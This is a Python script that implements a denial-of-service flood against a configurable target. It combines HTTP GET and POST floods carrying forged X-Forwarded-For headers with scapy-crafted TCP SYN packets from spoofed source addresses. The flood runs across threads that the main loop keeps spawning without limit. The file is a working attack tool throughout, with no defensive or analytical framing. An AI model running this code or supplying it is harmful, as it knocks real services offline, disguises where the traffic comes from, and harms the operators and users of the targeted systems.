import requests
import threading
import time
import random
import string
import os
from scapy.all import IP, TCP, send

class HTTPFlood:
    def __init__(self, target, port, base_fake_ip):
        self.target = target
        self.port = port
        self.base_fake_ip = base_fake_ip

    def generate_fake_ip(self):
        ip_parts = self.base_fake_ip.split('.')
        ip_parts[-1] = str(random.randint(1, 254))
        return '.'.join(ip_parts)

    def generate_random_data(self, size=10):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

    def send_get_request(self, fake_ip):
        url = f"http://{self.target}:{self.port}/"
        headers = {
            "User-Agent": "Python-HTTP-Flood",
            "X-Forwarded-For": fake_ip,
            "Connection": "keep-alive"
        }
        try:
            response = requests.get(url, headers=headers, timeout=1)
            print(f"GET request sent from fake IP: {fake_ip}, Response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"GET request failed from fake IP: {fake_ip}, Error: {e}")

    def send_post_request(self, fake_ip):
        url = f"http://{self.target}:{self.port}/"
        headers = {
            "User-Agent": "Python-HTTP-Flood",
            "X-Forwarded-For": fake_ip,
            "Connection": "keep-alive"
        }
        data = {"key": self.generate_random_data()}
        try:
            response = requests.post(url, headers=headers, data=data, timeout=1)
            print(f"POST request sent from fake IP: {fake_ip}, Response: {response.status_code}, Data: {data}")
        except requests.exceptions.RequestException as e:
            print(f"POST request failed from fake IP: {fake_ip}, Error: {e}")

    def send_syn_packet(self, fake_ip):
        ip = IP(src=fake_ip, dst=self.target)
        tcp = TCP(dport=self.port, sport=random.randint(1024, 65535), flags="S")
        packet = ip / tcp
        send(packet, verbose=0)
        print(f"SYN packet sent from fake IP: {fake_ip}")

    def attack(self):
        while True:
            fake_ip = self.generate_fake_ip()
            self.send_get_request(fake_ip)
            self.send_post_request(fake_ip)
            self.send_syn_packet(fake_ip)
            time.sleep(0.01)

    def start_attack(self, threads=5, delay=0.005):
        for _ in range(threads):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            thread.start()
            time.sleep(delay)

if __name__ == "__main__":
    target_ip = os.environ.get('TARGET_IP', '192.168.2.22')
    port = int(os.environ.get('PORT', 80))
    threads = int(os.environ.get('THREADS', 10))
    
    # Extract base IP from target
    ip_parts = target_ip.split('.')
    base_fake_ip = '.'.join(ip_parts[:3]) + '.'

    ddos = HTTPFlood(target_ip, port, base_fake_ip)
    try:
        while True:
            ddos.start_attack(threads=threads, delay=0.005)
    except KeyboardInterrupt:
        print("\nAttack stopped.")
